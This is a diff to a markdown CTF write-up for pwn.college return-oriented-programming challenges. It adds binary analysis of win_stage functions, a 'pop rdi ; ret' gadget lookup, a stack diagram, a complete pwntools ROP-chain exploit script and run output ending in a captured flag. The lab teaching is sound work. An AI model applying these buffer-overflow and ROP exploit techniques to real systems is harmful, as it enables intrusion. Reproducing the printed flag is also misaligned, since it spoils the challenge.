@@ -30,7 +30,9 @@ The solution to this challenge is a simple ret2win exploit as we used in [this](
 
 Let's find the offset of `win()` within the program.
 
-### `win()`
+### Bianry Analysis
+
+#### `win()`
 
 ```
 hacker@return-oriented-programming~loose-link-easy:/$ objdump -d -M intel /challenge/loose-link-easy | grep "<win>:"
@@ -117,6 +119,8 @@ We need the following for exploitation:
 - [ ] Location of return address to `main()`
 - [ ] Offset of instruction in `win()` within the program
 
+### Binary Analysis
+
 ```
 pwndbg> info functions
 All defined functions:
@@ -150,7 +154,7 @@ Non-debugging symbols:
 
 Let's get the offset of `win()` first.
 
-### `win()`
+#### `win()`
 
 ```
 pwndbg> info address win
@@ -161,7 +165,7 @@ Symbol "win" is at 0x4018a6 in a file compiled without debugging.
 - [ ] Location of return address to `main()`
 - [x] Offset of instruction in `win()` within the program: `0x4018a6`
 
-### `challenge()`
+#### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -357,14 +361,16 @@ and 8 that will overwrite the return address).
 
 This time we have to call two functions: `win_stage_1` and `win_stage_2`.
 
-### `win_stage_1`
+### Binary Analysis
+
+#### `win_stage_1`
 
 ```
 hacker@return-oriented-programming~call-chain-easy:/$ objdump -d -M intel /challenge/call-chain-easy | grep "<win_stage_1>:"
 0000000000401ffd <win_stage_1>:
 ```
 
-### `win_stage_2`
+#### `win_stage_2`
 
 ```
 hacker@return-oriented-programming~call-chain-easy:/$ objdump -d -M intel /challenge/call-chain-easy | grep "<win_stage_2>:"
@@ -449,6 +455,8 @@ hacker@return-oriented-programming~call-chain-hard:/$ /challenge/call-chain-hard
 
 Let's check which functions the program has.
 
+### Binary Analysis
+
 ```
 pwndbg> info functions
 All defined functions:
@@ -489,14 +497,14 @@ We need the following for exploitation:
 
 Let's first get the offsets of the `win_stage_*()` functions.
 
-### `win_stage_1()`
+#### `win_stage_1()`
 
 ```
 pwndbg> info address win_stage_1
 Symbol "win_stage_1" is at 0x40223e in a file compiled without debugging.
 ```
 
-### `win_stage_2()`
+#### `win_stage_2()`
 
 ```
 pwndbg> info address win_stage_2
@@ -508,7 +516,7 @@ Symbol "win_stage_2" is at 0x4022eb in a file compiled without debugging.
 - [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
 - [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`
 
-### `challenge()`
+#### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -706,40 +714,151 @@ That means that you will need to input at least 128 bytes (101 to fill the buffe
 and 8 that will overwrite the return address).
 ```
 
-### `win_stage_1()`
+This time we have to pass arguments to the `win_stage_*()` functions. In x86-64, the first argument goes inside the `rdi` register.
+Therefore, we will have to use a `pop rdi ; ret` gadget to load the arguments.
+
+All in all, we need the following to craft the exploit:
+
+- [ ] Offset of instruction in `win_stage_1()` within the program 
+- [ ] Offset of instruction in `win_stage_2()` within the program
+- [ ] Offset of instruction in `win_stage_3()` within the program
+- [ ] Offset of instruction in `win_stage_4()` within the program
+- [ ] Offset of instruction in `win_stage_5()` within the program
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+### Binary analysis
+
+Let's first get the offsets of all the `win_stage_*()` functions.
+
+#### `win_stage_1()`
 
 ```
 hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_1>:"
 00000000004028ba <win_stage_1>:
 ```
 
-### `win_stage_2()`
+#### `win_stage_2()`
 
 ```
 hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_2>:"
 0000000000402615 <win_stage_2>:
 ```
 
-### `win_stage_3()`
+#### `win_stage_3()`
 
 ```
 hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_3>:"
 00000000004026f5 <win_stage_3>:
 ```
 
-### `win_stage_4()`
+#### `win_stage_4()`
 
 ```
 hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_4>:"
 000000000040252f <win_stage_4>:
 ```
 
-### `win_stage_5()`
+#### `win_stage_5()`
 
 ```
 hacker@return-oriented-programming~chain-of-command-easy:/$ objdump -d -M intel /challenge/chain-of-command-easy | grep "<win_stage_5>:"
 00000000004027d7 <win_stage_5>:
 ```
+
+- [x] Offset of instruction in `win_stage_1()` within the program: `0x4028ba`
+- [x] Offset of instruction in `win_stage_2()` within the program: `0x402615`
+- [x] Offset of instruction in `win_stage_3()` within the program: `0x4026f5`
+- [x] Offset of instruction in `win_stage_4()` within the program: `0x40252f`
+- [x] Offset of instruction in `win_stage_5()` within the program: `0x4027d7`
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+#### `pop rdi ; ret` gadget
+
+Now, we have to fins the address of the ROP gadget.
+
+```
+hacker@return-oriented-programming~chain-of-command-easy:/$ ROPgadget --binary /challenge/chain-of-command-easy | grep "pop rdi ; ret"
+0x0000000000402ca3 : pop rdi ; ret
+```
+
+- [x] Offset of instruction in `win_stage_1()` within the program: `0x4028ba`
+- [x] Offset of instruction in `win_stage_2()` within the program: `0x402615`
+- [x] Offset of instruction in `win_stage_3()` within the program: `0x4026f5`
+- [x] Offset of instruction in `win_stage_4()` within the program: `0x40252f`
+- [x] Offset of instruction in `win_stage_5()` within the program: `0x4027d7`
+- [ ] Offset of `pop rdi ; ret` gadget within the program: `0x402ca3`
+
+### ROP chain
+
+- First we have to replace the return address with the address of the `pop rdi ; ret` gadget so that it is executed when `challenge()` returns.
+- Then we have to chain it with `p64(1)`, the relevant argument for on the `win_stage_1()` function so that it gets popped into the `rdi` register.
+- Finally we chain it with the address of the `win_stage_1@plt` call.
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+rsp --> return address ==> │  00 00 00 00 00 40 2c a3  │ --> pop rdi ; ret
+			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+			   │  00 00 00 00 00 00 00 01  │ --> 1
+			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+			   │  00 00 00 00 00 40 2b ba  │ --> win_stage_1()
+			   └───────────────────────────┘
+			   ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> challenge() return
+	// Pop the value pointed to by rsp into rip and move rsp by 8 bytes.
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+			   ┌───────────────────────────┐
+         	   rsp --> │  00 00 00 00 00 00 00 01  │ --> 1
+			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+			   │  00 00 00 00 00 40 2b ba  │ --> win_stage_1()   
+			   └───────────────────────────┘
+			   ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rdi
+	// Pop the value pointed to by rsp into rdi and move the rsp by 8 bytes.
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+			   ┌───────────────────────────┐
+		   rsp --> │  00 00 00 00 00 40 2b ba  │ --> win_stage_1()
+			   └───────────────────────────┘
+			   ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x01
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+	// Pop the address of win_stage_1() pointed to by rsp into rip and move rsp
+        // by 8 bytes.
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+			   ┌───────────────────────────┐
+		   rsp --> │  .. .. .. .. .. .. .. ..  │ 
+			   └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x01
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> win_stage_1()
+	// Call win_stage_1() with the argument that is stored in the rdi register.
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+This is to be repeated for all the `win_stage_*()` functions.
 
 ### Exploit
 
@@ -761,18 +880,36 @@ win_stage_5_arg = 5
 # Calculate offset
 offset = 120
 
-# Craft payload
-payload = b"A" * offset
+# Gadget address found
+pop_rdi = 0x402ca3
+
+# Base offset to reach the return address
+payload = b"A" * 120
+
+# Stage 1: win_stage_1(1)
+payload += p64(pop_rdi)
+payload += p64(1)
 payload += p64(win_stage_1_offset)
-payload += p64(win_stage_1_arg)
+
+# Stage 2: win_stage_2(2)
+payload += p64(pop_rdi)
+payload += p64(2)
 payload += p64(win_stage_2_offset)
-payload += p64(win_stage_2_arg)
+
+# Stage 3: win_stage_3(3)
+payload += p64(pop_rdi)
+payload += p64(3)
 payload += p64(win_stage_3_offset)
-payload += p64(win_stage_3_arg)
+
+# Stage 4: win_stage_4(4)
+payload += p64(pop_rdi)
+payload += p64(4)
 payload += p64(win_stage_4_offset)
-payload += p64(win_stage_4_arg)
+
+# Stage 5: win_stage_5(5)
+payload += p64(pop_rdi)
+payload += p64(5)
 payload += p64(win_stage_5_offset)
-payload += p64(win_stage_5_arg)
 
 attempt = 0
 
@@ -780,7 +917,7 @@ while True:
     attempt += 1
     print(f"[+] Attempt {attempt}")
 
-    p = process('/challenge/call-chain-hard')
+    p = process('/challenge/chain-of-command-easy')
     try:
         p.recvuntil("and 8 that will overwrite the return address).")
         p.send(payload)
@@ -795,4 +932,40 @@ while True:
         pass
     finally:
         p.close()
+```
+
+```
+hacker@return-oriented-programming~chain-of-command-easy:/$ python ~/script.py 
+[+] Attempt 1
+[+] Starting local process '/challenge/chain-of-command-easy': pid 10627
+/home/hacker/script.py:57: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.recvuntil("and 8 that will overwrite the return address).")
+[+] Receiving all data: Done (1.74KB)
+[*] Process '/challenge/chain-of-command-easy' stopped with exit code -11 (SIGSEGV) (pid 10627)
+[!!!] FLAG FOUND !!!
+
+Received 240 bytes! This is potentially 15 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 16 gadgets of ROP chain at 0x7fff0ad0d978.
+| 0x0000000000402ca3: pop rdi ; ret  ; 
+| 0x0000000000000001: (UNMAPPED MEMORY)
+| 0x00000000004028ba: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 1 ; je 0x4028e9 ; lea rdi, [rip + 0x8b9] ; call 0x401150 ; 
+| 0x0000000000402ca3: pop rdi ; ret  ; 
+| 0x0000000000000002: (UNMAPPED MEMORY)
+| 0x0000000000402615: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 2 ; je 0x402644 ; lea rdi, [rip + 0xb5e] ; call 0x401150 ; 
+| 0x0000000000402ca3: pop rdi ; ret  ; 
+| 0x0000000000000003: (UNMAPPED MEMORY)
+| 0x00000000004026f5: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 3 ; je 0x402724 ; lea rdi, [rip + 0xa7e] ; call 0x401150 ; 
+| 0x0000000000402ca3: pop rdi ; ret  ; 
+| 0x0000000000000004: (UNMAPPED MEMORY)
+| 0x000000000040252f: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 4 ; je 0x40255e ; lea rdi, [rip + 0xc44] ; call 0x401150 ; 
+| 0x0000000000402ca3: pop rdi ; ret  ; 
+| 0x0000000000000005: (UNMAPPED MEMORY)
+| 0x00000000004027d7: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 5 ; je 0x402806 ; lea rdi, [rip + 0x99c] ; call 0x401150 ; 
+| 0x0000000000000000: (UNMAPPED MEMORY)
+
+Leaving!
+pwn.college{AKuLaEeHPistmjz7_PyUH9Qd5vM.0VN0MDL4ITM0EzW}
 ```
